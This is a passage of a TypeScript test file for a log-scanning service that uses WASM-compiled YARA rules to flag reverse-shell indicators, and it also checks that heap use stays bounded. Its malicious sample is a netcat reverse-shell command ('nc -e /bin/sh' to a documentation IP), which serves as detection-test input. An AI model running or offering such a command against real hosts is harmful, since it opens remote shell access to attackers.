                    {
                      body: { bytesValue: "" },
                    },
                    {
                      body: { doubleValue: "NaN" },
                    },
                  ],
                },
              ],
            },
          ],
        }),
      }),
      env,
    );

    expect(res.status).toBe(202);
    expect(await res.json()).toEqual({ accepted: 4, matched: 2 });
    const records = sentBatches[0]!;
    expect(records).toHaveLength(4);
    for (const rec of records) {
      assertMatchesBasinSchema(rec);
    }
    expect(records[0]!.yara_rules).toContain("Linux_Reverse_Shell_Indicator");
    expect(JSON.parse(records[0]!.attributes_json!)).toMatchObject({
      metric_nan: "NaN",
      metric_pos_inf: "Infinity",
    });
    expect(records[1]!.yara_rules).toContain("Linux_Reverse_Shell_Indicator");
    expect(JSON.parse(records[1]!.attributes_json!)).toMatchObject({
      metric_neg_inf: "-Infinity",
    });
    expect(records[2]!.message).toBe("");
    expect(records[3]!.message).toBe("NaN");
  });

  it("maintains bounded WASM heap across 500 repeated scans including empty and oversized payloads", () => {
    const detector = new WasmYaraDetector(wasmModule, workerRuleSource);
    const symbols = {
      systemd_unit: "test.service",
      syslog_identifier: "test",
      transport: "stdout",
      comm: "sh",
      exe: "/bin/sh",
      host: "bench-host",
      priority: 6,
    };
    const empty = new Uint8Array(0);
    const benign = new TextEncoder().encode("normal operational log line");
    const malicious = new TextEncoder().encode("nc -e /bin/sh 192.0.2.1 4444");
    const oversized = new Uint8Array(100 * 1024);
    oversized.fill(0x41);

    try {
      // Warm up internal scratch buffers before recording baseline linear memory size.
      expect(detector.scan(empty, symbols)).toEqual([]);
      expect(detector.scan(benign, symbols)).toEqual([]);
      expect(detector.scan(malicious, symbols)).toHaveLength(1);
      expect(detector.scan(oversized, symbols)).toEqual([]);

      const baselineHeap = detector.heapByteLength;

      for (let i = 0; i < 500; i++) {
        expect(detector.scan(empty, symbols)).toEqual([]);
        expect(detector.scan(benign, symbols)).toEqual([]);
        const hits = detector.scan(malicious, symbols);
        expect(hits).toHaveLength(1);
        expect(hits[0]!.name).toBe("Linux_Reverse_Shell_Indicator");
        expect(detector.scan(oversized, symbols)).toEqual([]);
      }

      expect(detector.heapByteLength).toBe(baselineHeap);
    } finally {
      detector.dispose();
    }
  });
});
